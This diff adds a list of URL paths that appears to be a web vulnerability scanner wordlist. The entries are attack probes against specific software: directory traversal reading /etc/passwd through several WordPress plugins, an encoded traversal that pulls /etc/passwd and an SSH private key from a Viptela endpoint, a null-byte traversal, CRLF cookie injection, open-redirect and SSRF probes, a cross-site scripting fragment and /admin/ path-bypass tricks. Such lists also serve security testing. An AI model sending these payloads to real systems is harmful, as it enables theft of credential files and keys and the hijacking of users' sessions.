@@ -1,0 +1,16 @@
+/xxx/..;/admin/
+/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
+/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
+/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd
+/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fviptela%2F.ssh%2Fid_dsa
+/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448
+/lui/
+/hub/
+/~user/%0D%0ASet-Cookie:crlfinjection
+/updating.jsp?url=https://example.com/
+/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Fexample.com
+/community/?foro=signin&redirect_to=https://example.com/
+/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Fexample.com
+/Dialog/FileDialog.aspx?ed=foooooooooooooo%27);});});javascript:alert(
+/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://example.com/
+/./admin/
